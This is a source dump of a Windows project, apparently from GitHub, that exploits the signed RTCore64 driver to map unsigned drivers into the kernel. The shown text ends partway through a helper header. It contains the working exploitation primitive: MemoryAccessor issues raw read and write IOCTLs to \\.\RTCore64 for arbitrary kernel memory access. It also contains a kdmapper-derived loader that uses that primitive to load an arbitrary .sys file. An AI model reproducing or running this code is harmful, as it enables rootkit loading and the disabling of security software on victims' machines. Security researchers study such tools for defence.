Project Path: arc_gmh5225_RTCore64_Vulnerability_l52_6ol4

Source Tree:

```txt
arc_gmh5225_RTCore64_Vulnerability_l52_6ol4
├── LICENSE
├── README.md
├── RTCore64_Vulnerability
│   ├── MemoryAccessor.cpp
│   ├── MemoryAccessor.h
│   ├── RTCore64_Vulnerability.cpp
│   ├── RTCore64_Vulnerability.vcxproj
│   ├── RTCore64_Vulnerability.vcxproj.filters
│   ├── ezpdb.hpp
│   ├── intel_driver.cpp
│   ├── intel_driver.hpp
│   ├── kdmapper.cpp
│   ├── kdmapper.hpp
│   ├── nt.hpp
│   ├── portable_executable.cpp
│   ├── portable_executable.hpp
│   ├── rtcore64_driver_resource.h
│   ├── service.cpp
│   ├── service.hpp
│   ├── utils.cpp
│   └── utils.hpp
└── RTCore64_Vulnerability.sln

```

`LICENSE`:

```
MIT License

Copyright (c) 2024 oakboat

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# RTCore64_Vulnerability
Use a new RTCore64 to map your driver. RTCore64 is a white signed driver and it tested on win11.
# Show
![image](https://github.com/oakboat/RTCore64_Vulnerability/assets/27909321/d69768d8-6873-438c-88fd-613dca8fb4ea)

# Principle
This driver can read and any readable memory, the we use data ptr hook to call any function to map driver.
# Credit
- https://github.com/TheCruZ/kdmapper
- https://github.com/dvemon/data-ptr-comm
- https://github.com/Kwansy98/EasyPdb

```

`RTCore64_Vulnerability.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.8.34330.188
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "RTCore64_Vulnerability", "RTCore64_Vulnerability\RTCore64_Vulnerability.vcxproj", "{F8334111-DC3C-4FA8-9054-D5B856D64740}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{F8334111-DC3C-4FA8-9054-D5B856D64740}.Debug|x64.ActiveCfg = Debug|x64
		{F8334111-DC3C-4FA8-9054-D5B856D64740}.Debug|x64.Build.0 = Debug|x64
		{F8334111-DC3C-4FA8-9054-D5B856D64740}.Debug|x86.ActiveCfg = Debug|Win32
		{F8334111-DC3C-4FA8-9054-D5B856D64740}.Debug|x86.Build.0 = Debug|Win32
		{F8334111-DC3C-4FA8-9054-D5B856D64740}.Release|x64.ActiveCfg = Release|x64
		{F8334111-DC3C-4FA8-9054-D5B856D64740}.Release|x64.Build.0 = Release|x64
		{F8334111-DC3C-4FA8-9054-D5B856D64740}.Release|x86.ActiveCfg = Release|Win32
		{F8334111-DC3C-4FA8-9054-D5B856D64740}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {845D2851-FD79-4643-B157-0FE2CBDFE087}
	EndGlobalSection
EndGlobal

```

`RTCore64_Vulnerability/MemoryAccessor.cpp`:

```cpp
#include "MemoryAccessor.h"

MemoryAccessor::~MemoryAccessor() {
    if (hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(hDevice);
        hDevice = INVALID_HANDLE_VALUE;
    }
}

bool MemoryAccessor::Open()
{
    hDevice = CreateFile(
        L"\\\\.\\RTCore64",  // Device name, this depends on the actual device name
        GENERIC_READ | GENERIC_WRITE,  // Access rights
        0,  // Share mode, 0 means not shared
        NULL,  // Security attributes
        OPEN_EXISTING,  // Open an existing device
        FILE_ATTRIBUTE_NORMAL,  // Attributes and flags
        NULL  // Template handle
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }
    return true;
}

bool MemoryAccessor::ReadUint8(uintptr_t address, uint8_t* buffer)
{
    MemoryOperation operation{ 0 };
    operation.address = address;
    operation.size = sizeof(uint8_t);
    if (!DeviceIoControl(hDevice, 0x80002048, &operation, sizeof(operation), &operation, sizeof(operation), NULL, NULL))
    {
        return false;
    }
    *buffer = operation.data;
    return true;
}

bool MemoryAccessor::ReadUint16(uintptr_t address, uint16_t* buffer)
{
    MemoryOperation operation{ 0 };
    operation.address = address;
    operation.size = sizeof(uint16_t);
    if (!DeviceIoControl(hDevice, 0x80002048, &operation, sizeof(operation), &operation, sizeof(operation), NULL, NULL))
    {
        return false;
    }
    *buffer = operation.data;
    return true;
}

bool MemoryAccessor::ReadUint32(uintptr_t address, uint32_t* buffer)
{
    MemoryOperation operation{ 0 };
    operation.address = address;
    operation.size = sizeof(uint32_t);
    if (!DeviceIoControl(hDevice, 0x80002048, &operation, sizeof(operation), &operation, sizeof(operation), NULL, NULL))
    {
        return false;
    }
    *buffer = operation.data;
    return true;
}

bool MemoryAccessor::ReadMemory(uintptr_t address, void* buffer, size_t size) {
    for (size_t i = 0; i < size; ++i) {
        if (!ReadUint8(address + i, static_cast<uint8_t*>(buffer) + i)) {
            return false; // 读取失败
        }
    }
    return true;
}

bool MemoryAccessor::WriteUint8(uintptr_t address, uint8_t value)
{
    MemoryOperation operation{ 0 };
    operation.address = address;
    operation.size = sizeof(uint8_t);
    operation.data = value;
    if (!DeviceIoControl(hDevice, 0x8000204C, &operation, sizeof(operation), &operation, sizeof(operation), NULL, NULL))
    {
        return false;
    }
    return true;
}

bool MemoryAccessor::WriteUint16(uintptr_t address, uint16_t value)
{
    MemoryOperation operation{ 0 };
    operation.address = address;
    operation.size = sizeof(uint16_t);
    operation.data = value;
    if (!DeviceIoControl(hDevice, 0x8000204C, &operation, sizeof(operation), &operation, sizeof(operation), NULL, NULL))
    {
        return false;
    }
    return true;
}

bool MemoryAccessor::WriteUint32(uintptr_t address, uint32_t value)
{
    MemoryOperation operation{ 0 };
    operation.address = address;
    operation.size = sizeof(uint32_t);
    operation.data = value;
    if (!DeviceIoControl(hDevice, 0x8000204C, &operation, sizeof(operation), &operation, sizeof(operation), NULL, NULL))
    {
        return false;
    }
    return true;
}

bool MemoryAccessor::WriteMemory(uintptr_t address, const void* buffer, size_t size)
{
    const uint8_t* data = static_cast<const uint8_t*>(buffer);
    for (size_t i = 0; i < size; ++i)
    {
        if (!WriteUint8(address + i, data[i]))
        {
            return false; // 写入失败
        }
    }
    return true;
}
```

`RTCore64_Vulnerability/MemoryAccessor.h`:

```h
#pragma once
#include <cstdint>
#include <Windows.h>

class MemoryAccessor
{
public:
    struct MemoryOperation
    {
        uint8_t gap1[8];     // 8 bytes gap
        uint64_t address;  // 8 bytes
        uint8_t gap2[4];     // 4 bytes gap
        uint32_t offset;     // 4 bytes
        uint32_t size;       // 4 bytes
        uint32_t data;       // 4 bytes
        uint8_t gap3[16];    // 16 bytes gap
    };// Total size: 48 bytes

    HANDLE hDevice;

    ~MemoryAccessor();
    bool Open();
    bool ReadUint8(uintptr_t address, uint8_t* buffer);
    bool ReadUint16(uintptr_t address, uint16_t* buffer);
    bool ReadUint32(uintptr_t address, uint32_t* buffer);
    bool ReadMemory(uintptr_t address, void* buffer, size_t size);
    bool WriteUint8(uintptr_t address, uint8_t value);
    bool WriteUint16(uintptr_t address, uint16_t value);
    bool WriteUint32(uintptr_t address, uint32_t value);
    bool WriteMemory(uintptr_t address, const void* buffer, size_t size);
};


```

`RTCore64_Vulnerability/RTCore64_Vulnerability.cpp`:

```cpp
#ifndef KDLIBMODE

#include <Windows.h>
#include <string>
#include <vector>
#include <filesystem>

#include "kdmapper.hpp"

HANDLE iqvw64e_device_handle;


LONG WINAPI SimplestCrashHandler(EXCEPTION_POINTERS* ExceptionInfo)
{
	if (ExceptionInfo && ExceptionInfo->ExceptionRecord)
		Log(L"[!!] Crash at addr 0x" << ExceptionInfo->ExceptionRecord->ExceptionAddress << L" by 0x" << std::hex << ExceptionInfo->ExceptionRecord->ExceptionCode << std::endl);
	else
		Log(L"[!!] Crash" << std::endl);

	if (iqvw64e_device_handle)
		intel_driver::Unload(iqvw64e_device_handle);

	return EXCEPTION_EXECUTE_HANDLER;
}

int paramExists(const int argc, wchar_t** argv, const wchar_t* param) {
	size_t plen = wcslen(param);
	for (int i = 1; i < argc; i++) {
		if (wcslen(argv[i]) == plen + 1ull && _wcsicmp(&argv[i][1], param) == 0 && argv[i][0] == '/') { // with slash
			return i;
		}
		else if (wcslen(argv[i]) == plen + 2ull && _wcsicmp(&argv[i][2], param) == 0 && argv[i][0] == '-' && argv[i][1] == '-') { // with double dash
			return i;
		}
	}
	return -1;
}

void help() {
	Log(L"\r\n\r\n[!] Incorrect Usage!" << std::endl);
	Log(L"[+] Usage: kdmapper.exe [--free][--mdl][--PassAllocationPtr] driver" << std::endl);
}

bool callbackExample(ULONG64* param1, ULONG64* param2, ULONG64 allocationPtr, ULONG64 allocationSize, ULONG64 mdlptr) {
	UNREFERENCED_PARAMETER(param1);
	UNREFERENCED_PARAMETER(param2);
	UNREFERENCED_PARAMETER(allocationPtr);
	UNREFERENCED_PARAMETER(allocationSize);
	UNREFERENCED_PARAMETER(mdlptr);
	Log("[+] Callback example called" << std::endl);

	/*
	This callback occurs before call driver entry and
	can be usefull to pass more customized params in
	the last step of the mapping procedure since you
	know now the mapping address and other things
	*/
	return true;
}

DWORD getParentProcess()
{
	HANDLE hSnapshot;
	PROCESSENTRY32 pe32;
	DWORD ppid = 0, pid = GetCurrentProcessId();

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	__try {
		if (hSnapshot == INVALID_HANDLE_VALUE) __leave;

		ZeroMemory(&pe32, sizeof(pe32));
		pe32.dwSize = sizeof(pe32);
		if (!Process32First(hSnapshot, &pe32)) __leave;

		do {
			if (pe32.th32ProcessID == pid) {
				ppid = pe32.th32ParentProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &pe32));

	}
	__finally {
		if (hSnapshot != INVALID_HANDLE_VALUE) CloseHandle(hSnapshot);
	}
	return ppid;
}

//Help people that don't understand how to open a console
void PauseIfParentIsExplorer() {
	DWORD explorerPid = 0;
	GetWindowThreadProcessId(GetShellWindow(), &explorerPid);
	DWORD parentPid = getParentProcess();
	if (parentPid == explorerPid) {
		Log(L"[+] Pausing to allow for debugging" << std::endl);
		Log(L"[+] Press enter to close" << std::endl);
		std::cin.get();
	}
}

int wmain(const int argc, wchar_t** argv) {
	SetUnhandledExceptionFilter(SimplestCrashHandler);

	bool free = paramExists(argc, argv, L"free") > 0;
	bool mdlMode = paramExists(argc, argv, L"mdl") > 0;
	bool indPagesMode = paramExists(argc, argv, L"indPages") > 0;
	bool passAllocationPtr = paramExists(argc, argv, L"PassAllocationPtr") > 0;
	bool clean = paramExists(argc, argv, L"clean") > 0;

	if (free) {
		Log(L"[+] Free pool memory after usage enabled" << std::endl);
	}

	if (mdlMode) {
		Log(L"[+] Mdl memory usage enabled" << std::endl);
	}

	if (indPagesMode) {
		Log(L"[+] Allocate Independent Pages mode enabled" << std::endl);
	}

	if (passAllocationPtr) {
		Log(L"[+] Pass Allocation Ptr as first param enabled" << std::endl);
	}

	if (clean) {
		Log(L"[+] Clean Valnerable Driver enabled" << std::endl);
	}

	int drvIndex = -1;
	for (int i = 1; i < argc; i++) {
		if (std::filesystem::path(argv[i]).extension().string().compare(".sys") == 0) {
			drvIndex = i;
			break;
		}
	}

	if (drvIndex <= 0) {
		help();
		return -1;
	}

	const std::wstring driver_path = argv[drvIndex];

	if (!std::filesystem::exists(driver_path)) {
		Log(L"[-] File " << driver_path << L" doesn't exist" << std::endl);
		PauseIfParentIsExplorer();
		return -1;
	}

	iqvw64e_device_handle = intel_driver::Load(clean);

	if (iqvw64e_device_handle == INVALID_HANDLE_VALUE) {
		PauseIfParentIsExplorer();
		return -1;
	}
	iqvw64e_device_handle = INVALID_HANDLE_VALUE;

	std::vector<uint8_t> raw_image = { 0 };
	if (!utils::ReadFileToMemory(driver_path, &raw_image)) {
		Log(L"[-] Failed to read image to memory" << std::endl);
		intel_driver::Unload(iqvw64e_device_handle);
		PauseIfParentIsExplorer();
		return -1;
	}

	kdmapper::AllocationMode mode = kdmapper::AllocationMode::AllocatePool;

	if (mdlMode && indPagesMode) {
		Log(L"[-] Too many allocation modes" << std::endl);
		intel_driver::Unload(iqvw64e_device_handle);
		PauseIfParentIsExplorer();
		return -1;
	}
	else if (mdlMode) {
		mode = kdmapper::AllocationMode::AllocateMdl;
	}
	else if (indPagesMode) {
		mode = kdmapper::AllocationMode::AllocateIndependentPages;
	}

	NTSTATUS exitCode = 0;
	if (!kdmapper::MapDriver(iqvw64e_device_handle, raw_image.data(), 0, 0, free, true, mode, passAllocationPtr, callbackExample, &exitCode)) {
		Log(L"[-] Failed to map " << driver_path << std::endl);
		intel_driver::Unload(iqvw64e_device_handle);
		PauseIfParentIsExplorer();
		return -1;
	}

	if (!intel_driver::Unload(iqvw64e_device_handle)) {
		Log(L"[-] Warning failed to fully unload vulnerable driver " << std::endl);
		PauseIfParentIsExplorer();
	}
	Log(L"[+] success" << std::endl);
}

#endif
```

`RTCore64_Vulnerability/RTCore64_Vulnerability.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{f8334111-dc3c-4fa8-9054-d5b856d64740}</ProjectGuid>
    <RootNamespace>RTCore64Vulnerability</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp17</LanguageStandard>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp17</LanguageStandard>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="intel_driver.cpp" />
    <ClCompile Include="kdmapper.cpp" />
    <ClCompile Include="MemoryAccessor.cpp" />
    <ClCompile Include="portable_executable.cpp" />
    <ClCompile Include="RTCore64_Vulnerability.cpp" />
    <ClCompile Include="service.cpp" />
    <ClCompile Include="utils.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="ezpdb.hpp" />
    <ClInclude Include="intel_driver.hpp" />
    <ClInclude Include="kdmapper.hpp" />
    <ClInclude Include="MemoryAccessor.h" />
    <ClInclude Include="nt.hpp" />
    <ClInclude Include="portable_executable.hpp" />
    <ClInclude Include="rtcore64_driver_resource.h" />
    <ClInclude Include="service.hpp" />
    <ClInclude Include="utils.hpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`RTCore64_Vulnerability/RTCore64_Vulnerability.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="源文件">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="头文件">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="资源文件">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="RTCore64_Vulnerability.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
    <ClCompile Include="MemoryAccessor.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
    <ClCompile Include="utils.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
    <ClCompile Include="intel_driver.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
    <ClCompile Include="service.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
    <ClCompile Include="kdmapper.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
    <ClCompile Include="portable_executable.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="MemoryAccessor.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="utils.hpp">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="nt.hpp">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="intel_driver.hpp">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="service.hpp">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="rtcore64_driver_resource.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="kdmapper.hpp">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="portable_executable.hpp">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="ezpdb.hpp">
      <Filter>头文件</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`RTCore64_Vulnerability/ezpdb.hpp`:

```hpp
#pragma once

#include <stdio.h>
#include <Windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <Shlwapi.h>

#pragma comment(lib, "DbgHelp.lib")
#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "Shlwapi.lib")

namespace ez
{
#pragma warning(push,1)
	namespace md5
	{

		// https://github.com/pod32g/MD5/blob/master/md5.c

		// Constants are the integer part of the sines of integers (in radians) * 2^32.
		const UINT32 k[64] = {
		0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee ,
		0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501 ,
		0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be ,
		0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821 ,
		0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa ,
		0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8 ,
		0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed ,
		0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a ,
		0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c ,
		0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70 ,
		0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05 ,
		0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665 ,
		0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039 ,
		0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1 ,
		0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1 ,
		0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391 };

		// r specifies the per-round shift amounts
		const UINT32 r[] = { 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
							  5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20,
							  4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
							  6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21 };

		// leftrotate function definition
#define LEFTROTATE(x, c) (((x) << (c)) | ((x) >> (32 - (c))))

		void to_bytes(UINT32 val, UINT8* bytes)
		{
			bytes[0] = (UINT8)val;
			bytes[1] = (UINT8)(val >> 8);
			bytes[2] = (UINT8)(val >> 16);
			bytes[3] = (UINT8)(val >> 24);
		}

		UINT32 to_int32(const UINT8* bytes)
		{
			return (UINT32)bytes[0]
				| ((UINT32)bytes[1] << 8)
				| ((UINT32)bytes[2] << 16)
				| ((UINT32)bytes[3] << 24);
		}

		void md5(const UINT8* initial_msg, UINT32 initial_len, UINT8* digest) {

			// These vars will contain the hash
			UINT32 h0, h1, h2, h3;

			// Message (to prepare)
			UINT8* msg = NULL;

			UINT32 new_len, offset;
			UINT32 w[16];
			UINT32 a, b, c, d, i, f, g, temp;

			// Initialize variables - simple count in nibbles:
			h0 = 0x67452301;
			h1 = 0xefcdab89;
			h2 = 0x98badcfe;
			h3 = 0x10325476;

			for (new_len = initial_len + 1; new_len % (512 / 8) != 448 / 8; new_len++)
				;

#ifdef _KERNEL_MODE
			msg = (UINT8*)ExAllocatePoolWithTag(PagedPool, new_len + 8, POOLTAG);
#else
			msg = (UINT8*)malloc((size_t)new_len + 8);
#endif
			if (!msg)
			{
				return;
			}
			memcpy(msg, initial_msg, initial_len);
			msg[initial_len] = 0x80; // append the "1" bit; most significant bit is "first"
			for (offset = initial_len + 1; offset < new_len; offset++)
				msg[offset] = 0; // append "0" bits

			// append the len in bits at the end of the buffer.
			to_bytes(initial_len * 8, msg + new_len);
			// initial_len>>29 == initial_len*8>>32, but avoids overflow.
			to_bytes(initial_len >> 29, msg + new_len + 4);

			// Process the message in successive 512-bit chunks:
			//for each 512-bit chunk of message:
			for (offset = 0; offset < new_len; offset += (512 / 8)) {
				for (i = 0; i < 16; i++)
					w[i] = to_int32(msg + offset + i * 4);

				// Initialize hash value for this chunk:
				a = h0;
				b = h1;
				c = h2;
				d = h3;

				// Main loop:
				for (i = 0; i < 64; i++) {

					if (i < 16) {
						f = (b & c) | ((~b) & d);
						g = i;
					}
					else if (i < 32) {
						f = (d & b) | ((~d) & c);
						g = (5 * i + 1) % 16;
					}
					else if (i < 48) {
						f = b ^ c ^ d;
						g = (3 * i + 5) % 16;
					}
					else {
						f = c ^ (b | (~d));
						g = (7 * i) % 16;
					}

					temp = d;
					d = c;
					c = b;
					b = b + LEFTROTATE((a + f + k[i] + w[g]), r[i]);
					a = temp;

				}

				// Add this chunk's hash to result so far:
				h0 += a;
				h1 += b;
				h2 += c;
				h3 += d;

			}

			// cleanup
#ifdef _KERNEL_MODE
			ExFreePoolWithTag(msg, POOLTAG);
#else
			free(msg);
#endif


			//var char digest[16] := h0 append h1 append h2 append h3 //(Output is in little-endian)
			to_bytes(h0, digest);
			to_bytes(h1, digest + 4);
			to_bytes(h2, digest + 8);
			to_bytes(h3, digest + 12);
		}


		std::string Md5(PVOID buffer, ULONG bufferLen)
		{
			UINT8 raw[16];
			std::string res;

			md5((const UINT8*)buffer, bufferLen, raw);

			for (size_t i = 0; i < 16; i++)
			{
				char ch[4] = { 0 };
				snprintf(ch, ARRAYSIZE(ch), "%02x", raw[i]);
				res += ch;
			}

			return res;
		}

		std::string Md5(std::string filePath)
		{
